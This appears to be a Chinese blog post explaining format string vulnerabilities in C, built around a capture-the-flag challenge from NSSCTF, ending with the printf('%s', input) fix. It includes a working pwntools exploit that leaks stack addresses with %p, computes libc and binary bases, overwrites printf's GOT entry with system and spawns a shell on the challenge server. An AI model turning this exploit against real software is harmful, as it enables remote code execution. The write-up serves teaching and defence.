---
title: 格式化字符串漏洞及防范措施
published: 2026-02-18
description: 如何防范格式化字符串漏洞
tags: [格式化字符串]
category: 后端开发
draft: false
---
## 格式化字符串漏洞原理
格式化字符串漏洞是指在程序中，使用格式化字符串函数（如`printf`、`sprintf`、`snprintf`等）将用户输入的数据格式化成字符串，并输出到终端或文件中。如果用户输入的数据中包含了格式化字符串的控制字符，那么就会导致格式化字符串漏洞。

#### 例如
```c
printf(user_input);
```

这里的`printf`直接输出用户的字符串会有问题。`printf`函数会根据格式化字符串自动去参数位置取对应的参数，函数一般有`4-6`个参数在寄存器上，剩下的是去栈上取。攻击者使用`%p`可以获取栈上内容，这时候就会泄露栈上信息，使攻击者拿到`libc_base`和`程序基址`，从而算出来函数和变量的位置。而另一个占位符`%n`可以写入变量，从而控制变量的值，从而控制程序的执行。

## 参考
现在以`NSSCTF`的题面为例

[NSS_printer_I](https://www.nssctf.cn/problem/392)

题目反编译代码有：
```c
int main(void)
{
  long stack_cookie;
  char user_input[104];
  long saved_register;
  
  saved_register = *(long *)(stack_cookie + 0x28);
  initialize_program();
  do {
    puts("======================================");
    puts("=====welcome to use NSS printer!======");
    printf("input what you want to say: ");
    read(0, user_input, sizeof(user_input) - 1);
    printf("you said: ");
    printf(user_input);
  } while(1);
}
```

这里的`printf`是一个典型的格式化字符串漏洞。

我们首先看栈上的存储结构：
```python
p = remote("node4.anna.nssctf.cn", 24249)
elf = ELF('./lst')
libc = ELF('./glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')
payload='A'*8+"%p\n"*30
p.sendline(payload.encode())
while True:
    print(p.recv().decode(errors='ignore'))
```
这里我们直接输出`30`个栈上内容，得到结果：
```cpp
...
0x4141414141414141
...
0x7f3e8ddda840
...
0x55d91eb20a14
```
这里我是找出来的是`6 21 25`三个位置。

`6`是因为`A`的编码是0x41，所以`6`是`buf`在栈上的起点。

`21`是`libc_start_main`的返回地址，因为一个物理事实是`libc_base`地址和`0x1000`页对齐，且高地址位存在`main`函数的返回地址，也就是`libc_start_main`的起始地址加`main`返回的偏移量。这样程序算出来的`libc_base`符合条件，基本就可以确定，反推出`libc_base`的起始地址。

`25`则是在使用`nm`工具解包程序时有：
```
0000000000000a14 T main
```
`25`推出的程序基址也符合条件，筛选时根据地址特征可以快速判断出来。

#### 利用方法
```python
p = remote("node4.anna.nssctf.cn", 24249)
elf = ELF('./lst')
libc = ELF('./glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')
payload='A'*8+"%p\n"*30
p.sendline(payload.encode())
payload = f"%{21}$p.%{25}$p"
p.sendlineafter(b"say: ", payload.encode())
p.recvuntil(b'0x')
addr = int(p.recv(12), 16)
cd=addr-libc.symbols['__libc_start_main']-240
p.recvuntil(b'0x')
pro=int(p.recv(12),16)-0xa14
printf_got = pro+elf.got['printf']
system = cd+libc.symbols['system']
payload = fmtstr_payload(6,{printf_got: system})
print(hexdump(payload))
p.sendlineafter(b"say: ", payload)
p.sendline(b"/bin/sh\x00")
p.interactive()
```
这个脚本是利用漏洞把`printf`的got表地址覆盖成`system`函数地址，调用`printf`函数时，会调用`system`函数，从而执行命令。

## 防范措施
防范方法非常简单，不要把用户输入作为`格式化字符串`，而是使用占位符输出拼凑：
```c
printf("%s", user_input);
```